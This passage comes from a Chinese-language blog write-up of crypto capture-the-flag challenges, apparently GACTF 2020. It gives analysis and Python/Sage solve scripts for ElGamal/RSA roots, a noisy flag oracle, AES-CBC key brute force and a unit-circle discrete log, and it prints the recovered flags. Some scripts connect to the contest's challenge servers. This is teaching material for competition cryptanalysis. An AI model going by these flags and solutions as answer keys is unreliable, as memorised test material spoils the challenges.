class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">g, h, A, B, p, q = </span><br><span class="line">c1, c2 = </span><br><span class="line">c11, c22 = </span><br><span class="line">M = (pow(c2, B, p) * pow(h, A, p) * inverse(c22, p)) % p</span><br><span class="line"><span class="keyword">assert</span>(GCD(B<span class="number">-1</span>, p<span class="number">-1</span>) == <span class="number">1</span>)</span><br><span class="line">secret = int(pow(M, inverse(B<span class="number">-1</span>, p<span class="number">-1</span>), p))</span><br><span class="line"><span class="comment"># yafu factor</span></span><br><span class="line">m0 = <span class="number">653551912583</span></span><br><span class="line">m = m0**<span class="number">15</span></span><br><span class="line">c = </span><br><span class="line">e = <span class="number">0x1296</span></span><br><span class="line"><span class="keyword">assert</span>(GCD(e, (m*(m0<span class="number">-1</span>))//m0) == <span class="number">2</span>)</span><br><span class="line">c = int(pow(c, inverse(e//<span class="number">2</span>,(m*(m0<span class="number">-1</span>))//m0), m))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AMM</span><span class="params">(delta, r, q, k = <span class="number">1</span>)</span>:</span> <span class="comment"># get one special a s.t. a**r \equiv delta % q**k where b_x | phi(q**k)</span></span><br><span class="line">    <span class="comment"># r, q are supposed to be primes</span></span><br><span class="line"></span><br><span class="line">    phi = (q - <span class="number">1</span>) * q**(k - <span class="number">1</span>)</span><br><span class="line">    mod = q ** k</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        rho = getRandomRange(<span class="number">1</span>, mod)</span><br><span class="line">        <span class="keyword">if</span>(pow(rho, phi // r, mod) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        s = phi</span><br><span class="line">        <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">            s //= r</span><br><span class="line">            t += <span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span> gcd(r, s) == <span class="number">1</span></span><br><span class="line">        alpha = inverse(r, s)</span><br><span class="line">        a, b, c, h = pow(rho, phi // r, mod),pow(delta, r * alpha - <span class="number">1</span>, mod), pow(rho, s, mod), <span class="number">1</span></span><br><span class="line">        j, k = <span class="number">0</span>, phi // (r * s)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, t):</span><br><span class="line">            k //= r</span><br><span class="line">            d = pow(b, k, mod)</span><br><span class="line">            <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                j = phi - discrete_log(d, a)</span><br><span class="line">            b, h, c = b * pow(c, r * j, mod) % mod, h * pow(c, j, mod), pow(c, r, mod)</span><br><span class="line">        <span class="keyword">return</span> pow(delta, alpha, mod) * h % mod</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allroot</span><span class="params">(root, r, q, k = <span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="comment"># find all roots satisfy a**r \equiv delta % q**k</span></span><br><span class="line">    </span><br><span class="line">    phi = (q - <span class="number">1</span>) * q**(k - <span class="number">1</span>)</span><br><span class="line">    mod = q ** k</span><br><span class="line">    all_root = set()</span><br><span class="line">    all_root.add(root)</span><br><span class="line">    <span class="keyword">while</span> len(all_root) &lt; r:</span><br><span class="line">        new_root = root</span><br><span class="line">        unity = pow(getRandomRange(<span class="number">2</span>, mod), phi // r, mod)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(r - <span class="number">1</span>):</span><br><span class="line">            new_root = (new_root * unity) % mod</span><br><span class="line">            all_root.add(new_root)</span><br><span class="line">    <span class="keyword">return</span> all_root</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> list(allroot(AMM(c, <span class="number">2</span>, m0, <span class="number">15</span>), <span class="number">2</span>, m0, <span class="number">15</span>)):</span><br><span class="line">    print(long_to_bytes(flag))</span><br><span class="line"><span class="comment"># b'you_4re_good_at_b0th_el94mal_and_rs4'</span></span><br></pre></td></tr></table></figure><h3 id="what_r_the_noise">what_r_the_noise</h3><h4 id="题解分析-2">[题解分析]</h4><p>可无限次获取flag带偏差的ascii值，取平均就行- -就这就这</p><p>看出的flag的意思，应该和差分隐私有关，彳亍</p><h4 id="exp-1">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"124.71.145.165"</span>, <span class="string">"9999"</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">":"</span>, <span class="string">"2"</span>)</span><br><span class="line">flag = [eval(_) <span class="keyword">for</span> _ <span class="keyword">in</span> io.recvline().strip().decode()[:<span class="number">-1</span>].split(<span class="string">","</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_noise</span><span class="params">(flag, i)</span>:</span></span><br><span class="line">    flag_with_noise = [<span class="number">0</span>] * len(flag)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>**i):</span><br><span class="line">        io.sendlineafter(<span class="string">":"</span>, <span class="string">"2"</span>)</span><br><span class="line">        new_flag_with_noise = [eval(_) <span class="keyword">for</span> _ <span class="keyword">in</span> io.recvline().strip().decode()[:<span class="number">-1</span>].split(<span class="string">","</span>)]</span><br><span class="line">        flag_with_noise = [flag_with_noise[i] + new_flag_with_noise[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag))]</span><br><span class="line">    flag_with_noise = [_ / (<span class="number">2</span>**i) <span class="keyword">for</span> _ <span class="keyword">in</span> flag_with_noise]</span><br><span class="line">    flag = [(flag[i] + flag_with_noise[i]) / <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag))]</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">10</span>)):</span><br><span class="line">    flag = remove_noise(flag, i)</span><br><span class="line">    print(bytes([round(_) <span class="keyword">for</span> _ <span class="keyword">in</span> flag]))</span><br><span class="line">    </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[+] Opening connection to 124.71.145.165 on port 9999: Done</span></span><br><span class="line"><span class="string">  0%|                                                                                                                                                                                | 0/10 [00:00&lt;?, ?it/s]b'k^gufxyrt\\gnlvfrwcf_]anvo_ejodftensicq^ptjvfcy\x80'</span></span><br><span class="line"><span class="string"> 10%|████████████████▊                                                                                                                                                       | 1/10 [00:00&lt;00:01,  7.45it/s]b'j_euf&#123;ypx_hnmvanvch__`n&#125;pabliffqfnshao_orjueaz~'</span></span><br><span class="line"><span class="string"> 20%|█████████████████████████████████▌                                                                                                                                      | 2/10 [00:00&lt;00:01,  5.56it/s]b'hbdug|xpv`jnnwanvcf`banyr`dkgfdqfoshan`qqjvb`&#123;|'</span></span><br><span class="line"><span class="string"> 30%|██████████████████████████████████████████████████▍                                                                                                                     | 3/10 [00:00&lt;00:02,  3.47it/s]b'hacug|xou`kmow_lubh`bbows`dkegdrfntian_qqivabx&#125;'</span></span><br><span class="line"><span class="string"> 40%|███████████████████████████████████████████████████████████████████▏                                                                                                    | 4/10 [00:02&lt;00:03,  1.84it/s]b'g`cuf&#123;xot`kmow_mvcg`aaovt_dkfffrentiam_privaby&#125;'</span></span><br><span class="line"><span class="string"> 50%|████████████████████████████████████████████████████████████████████████████████████                                                                                    | 5/10 [00:04&lt;00:05,  1.02s/it]b'g`ctf&#123;xou_jnow_mvcg_about_djfffrentiam_priv`cy&#125;'</span></span><br><span class="line"><span class="string"> 60%|████████████████████████████████████████████████████████████████████████████████████████████████████▊                                                                   | 6/10 [00:08&lt;00:08,  2.04s/it]b'gactf&#123;you_jnow_much_abous_difffrential_privacy&#125;'</span></span><br><span class="line"><span class="string"> 70%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▌                                                  | 7/10 [00:17&lt;00:12,  4.13s/it]b'gactf&#123;you_jnow_much_about_differential_privacy&#125;'</span></span><br><span class="line"><span class="string"> 80%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▍                                 | 8/10 [00:35&lt;00:16,  8.27s/it]b'gactf&#123;you_know_much_about_differential_privacy&#125;'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="ezaes">EzAES</h3><h4 id="题解分析-3">[题解分析]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b'T0EyZaLRzQmNe2**'</span> <span class="comment"># $O(2^&#123;16&#125;)$</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message,passphrase,iv)</span>:</span></span><br><span class="line">aes = AES.new(passphrase, AES.MODE_CBC, iv)</span><br><span class="line"><span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"></span><br><span class="line">h = hashlib.md5(key).hexdigest()</span><br><span class="line">SECRET = binascii.unhexlify(h)[:<span class="number">10</span>]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">IV = f.read().strip(<span class="string">b'gactf&#123;'</span>).strip(<span class="string">b'&#125;'</span>)</span><br><span class="line">message = <span class="string">b'AES CBC Mode is commonly used in data encryption. What do you know about it?'</span>+SECRET</span><br><span class="line">print(<span class="string">"Encrypted data: "</span>, binascii.hexlify(encrypt(pad(message),key,IV)))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Encrypted data: b'a8**************************b1a923**************************011147**************************6e094e**************************cdb1c7**********a32c412a3e7474e584cd72481dab9dd83141706925d92bdd39e4'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>分段print下cipher发现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'a8**************************b1a9'</span></span><br><span class="line"><span class="string">b'23**************************0111'</span></span><br><span class="line"><span class="string">b'47**************************6e09'</span></span><br><span class="line"><span class="string">b'4e**************************cdb1'</span></span><br><span class="line"><span class="string">b'c7**********a32c412a3e7474e584cd'</span></span><br><span class="line"><span class="string">b'72481dab9dd83141706925d92bdd39e4'</span></span><br></pre></td></tr></table></figure><p>于是只要在<span class="math inline">\(O(2^{16})\)</span>下爆破key，取最后一块作ECB解密，再与已知的倒二块后10bytes异或，当异或结果为message末位padding(<code>b'\x10'*10</code>)，即找到正确key</p><p>接下来从后往前逐块进行ECB解密（message已全部得到），即可推出iv</p><h4 id="exp-2">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii, sys, hashlib</span><br><span class="line"></span><br><span class="line">key = list(<span class="string">b'T0EyZaLRzQmNe2**'</span>)</span><br><span class="line"></span><br><span class="line">KEYSIZE = <span class="number">16</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(message)</span>:</span></span><br><span class="line">    p = bytes((KEYSIZE - len(message) % KEYSIZE) * chr(KEYSIZE - len(message) % KEYSIZE),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">return</span> message + p</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">b'a8**************************b1a923**************************011147**************************6e094e**************************cdb1c7**********a32c412a3e7474e584cd72481dab9dd83141706925d92bdd39e4'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        k = bytes(key[:<span class="number">-2</span>] + [i, j])</span><br><span class="line">        h = hashlib.md5(k).hexdigest()</span><br><span class="line">        SECRET = binascii.unhexlify(h)[:<span class="number">10</span>]</span><br><span class="line">        aes = AES.new(k, AES.MODE_ECB)</span><br><span class="line">        <span class="keyword">if</span> xor(aes.decrypt(binascii.unhexlify(cipher[<span class="number">-32</span>:]))[<span class="number">-10</span>:], binascii.unhexlify(cipher[<span class="number">-52</span>:<span class="number">-32</span>])) == bytes([<span class="number">10</span>] * <span class="number">10</span>):</span><br><span class="line">            print(k)</span><br><span class="line">            print(SECRET)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'T0EyZaLRzQmNe2pd'</span></span><br><span class="line"><span class="string">b'\xfc\x89\xb4\xd5\xe2\x0b\xd2\xc6U\xae'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">b'T0EyZaLRzQmNe2pd'</span></span><br><span class="line">SECRET = <span class="string">b'\xfc\x89\xb4\xd5\xe2\x0b\xd2\xc6U\xae'</span></span><br><span class="line">message = pad(<span class="string">b'AES CBC Mode is commonly used in data encryption. What do you know about it?'</span>+SECRET)</span><br><span class="line">ct = binascii.unhexlify(cipher[<span class="number">-32</span>:])</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    ct = xor(aes.decrypt(ct), message[<span class="number">-16</span>:])</span><br><span class="line">    message = message[:<span class="number">-16</span>]</span><br><span class="line">iv = xor(aes.decrypt(ct), message[<span class="number">-16</span>:])</span><br><span class="line">iv</span><br><span class="line"><span class="comment"># b'9j_for_aes_cbc!!'</span></span><br></pre></td></tr></table></figure><h3 id="square">square</h3><h4 id="题解分析-4">[题解分析]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'Please give me 100 (x,y) which satisfies x**2 = ( 1**2 + 2**2 + ... + y**2) / y\n'</span></span><br></pre></td></tr></table></figure><p>找满足<span class="math inline">\(6x^{2}=(y+1)(2y+1)\)</span>的100组(x, y)</p><p>直接暴力跑出前三组<span class="math inline">\((x, y)\)</span>，然后上oeis找到递推式</p><p><a href="https://oeis.org/search?q=1%2C337%2C65521&amp;sort=&amp;language=&amp;go=Search" target="_blank" rel="noopener">https://oeis.org/search?q=1%2C337%2C65521&amp;sort=&amp;language=&amp;go=Search</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FORMULA</span><br><span class="line">a(n) &#x3D; ((7&#x2F;2 + 2*sqrt(3))*(97 + 56*sqrt(3))^n + (7&#x2F;2 - 2*sqrt(3))*(97 - 56*sqrt(3))^n - 3)&#x2F;4.</span><br><span class="line"></span><br><span class="line">a(n) &#x3D; (floor((7&#x2F;2 + 2*sqrt(3))*(97 + 56*sqrt(3))^n) - 2)&#x2F;4.</span><br><span class="line"></span><br><span class="line">a(n+3) &#x3D; 195*(a(n+2) - a(n+1)) + a(n).</span><br></pre></td></tr></table></figure><h4 id="exp-3">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">import</span> string, re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"124.71.158.89"</span>, <span class="string">"8888"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    msg = io.recvline().strip().decode()</span><br><span class="line">    suffix = re.findall(<span class="string">r"md5\(str \+ (.*)\)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    cipher = re.findall(<span class="string">r"== (.*)"</span>, msg)[<span class="number">0</span>]</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((x + suffix).encode(<span class="string">"latin-1"</span>)).hexdigest()[:<span class="number">5</span>] ==</span><br><span class="line">                        cipher, string.ascii_lowercase + string.digits, length=<span class="number">5</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Give me xxxxx: "</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># a(n+3) = 195*(a(n+2) - a(n+1)) + a(n)</span></span><br><span class="line">    data = [(<span class="number">1</span>, <span class="number">1</span>), (<span class="number">195</span>, <span class="number">337</span>), (<span class="number">37829</span>, <span class="number">65521</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">97</span>):</span><br><span class="line">        y = <span class="number">195</span> * (data[<span class="number">-1</span>][<span class="number">1</span>] - data[<span class="number">-2</span>][<span class="number">1</span>]) + data[<span class="number">-3</span>][<span class="number">1</span>]</span><br><span class="line">        x = int(iroot(((y + <span class="number">1</span>) * (<span class="number">2</span> * y + <span class="number">1</span>)) // <span class="number">6</span>, <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">        data.append((x, y))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        io.sendlineafter(<span class="string">"[&gt;] x: "</span>, str(data[i][<span class="number">0</span>]))</span><br><span class="line">        io.sendlineafter(<span class="string">"[&gt;] y: "</span>, str(data[i][<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line">send_data()</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">You are right!</span></span><br><span class="line"><span class="string">flag is: gactf&#123;congrts_you_solve_it&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="babycrypto">babycrypto</h3><h4 id="题解分析-5">[题解分析]</h4><p>完全出原题可还行，甚至p都一样</p><p><a href="https://keltecc.github.io/ctf/writeup/2020/05/24/m0lecon-ctf-2020-teaser-king-exchange.html" target="_blank" rel="noopener">https://keltecc.github.io/ctf/writeup/2020/05/24/m0lecon-ctf-2020-teaser-king-exchange.html</a></p><p>基点g，啥提示没有，原题也是屑题，盲猜<span class="math inline">\(x_{g}^{2}+y_{g}^{2}=1(mod\ p)\)</span>，由add function可知： <span class="math display">\[(x,y) =&gt; x^2+y^2\\(x^2-y^2,2xy) =&gt; x^4-2x^2y^2+y^4+4x^2y^2=x^4+2x^2y^2+y^4=(x^2+y^2)^2\]</span> 也就是说在g为基点时，mutiply得到的整个域上均满足<span class="math inline">\(x^{2}+y^{2}\equiv 1(mod\ p)\)</span></p><p>给出两个点A,B，利用<span class="math inline">\(gcd(x_{A}^{2}+y_{A}^{2}-1,x_{B}^{2}+y_{B}^{2}-1)\)</span>得到p</p><p>得到p后，想要得到<code>shared = multiply(A, b)[0]</code></p><p>由于前述点集的通项和add function，可将其表示为单位⚪上的点</p><p>sage对某个域存在<code>extend</code>函数，参数可传入一个polynomial，作用大概就是将这个域引入该polynomial对应的所有根（包括虚根），再重新形成环的定义后返回一个<strong>扩展域</strong>（和先前的商环quotient不同）</p><p>因此用该扩展域表示单位圆上的点，求解DLP即可得到b，进而获得share</p><h4 id="exp-4">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">A = (<span class="number">68279847973010227567437241690876400434176575735647388141445319082120661</span>, <span class="number">36521392659318312718307506287199839545959127964141955928297920414981390</span>)</span><br><span class="line">B = (<span class="number">84698630137710906531637499064120297563999383201108850561060383338482806</span>, <span class="number">10975400339031190591877824767290004140780471215800442883565278903964109</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = GCD(A[<span class="number">0</span>]^<span class="number">2</span>+A[<span class="number">1</span>]^<span class="number">2</span><span class="number">-1</span>, B[<span class="number">0</span>]^<span class="number">2</span>+B[<span class="number">1</span>]^<span class="number">2</span><span class="number">-1</span>)</span><br><span class="line">factor(p)</span><br><span class="line"><span class="comment"># 2^2 * 108848362000185157098908557633810357240367513945191048364780883709439999</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">108848362000185157098908557633810357240367513945191048364780883709439999</span></span><br><span class="line">g = (<span class="number">29223879291878505213325643878338189297997503744039619988987863719655098</span>, <span class="number">32188620669315455017576071518169599806490004123869726364682284676721556</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_points</span><span class="params">(P, Q)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ((P[<span class="number">0</span>]*Q[<span class="number">0</span>]-P[<span class="number">1</span>]*Q[<span class="number">1</span>]) % p, (P[<span class="number">0</span>]*Q[<span class="number">1</span>]+P[<span class="number">1</span>]*Q[<span class="number">0</span>]) % p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply</span><span class="params">(P, n)</span>:</span></span><br><span class="line">    Q = (<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            Q = add_points(Q, P)</span><br><span class="line">        P = add_points(P, P)</span><br><span class="line">        n = n//<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line">F = GF(p)</span><br><span class="line">R.&lt;w&gt; = PolynomialRing(F)</span><br><span class="line">K.&lt;w&gt; = F.extension(w^<span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">g_K = g[<span class="number">0</span>] + g[<span class="number">1</span>]*w</span><br><span class="line">B_K = B[<span class="number">0</span>] + B[<span class="number">1</span>]*w</span><br><span class="line">b = discrete_log(B_K, g_K)</span><br><span class="line">print(b)</span><br><span class="line">print(multiply(g, b) == B)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">42167952593276919058888649873311585235839247920808784925745017581061391</span></span><br><span class="line"><span class="string">True</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">shared = multiply(A, b)[<span class="number">0</span>]</span><br><span class="line">key = sha256(long_to_bytes(shared)).digest()</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plaintext = aes.decrypt(bytes.fromhex(<span class="string">"26b1b05962d188f1f2abdfad2cef049d45cfc27d9e46f40ebe52e367941bcfa05dd0ef698f528375be2185759e663431"</span>))</span><br><span class="line">print(plaintext)</span><br><span class="line"><span class="comment"># b'gactf&#123;354b6ce4c03387a828a3c30061213204&#125;\t\t\t\t\t\t\t\t\t'</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(强网杯2020) - Crypto</title>
      <link href="/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/"/>
      <url>/2020/08/24/WriteUp-%E5%BC%BA%E7%BD%91%E6%9D%AF2020-Crypto/</url>
      
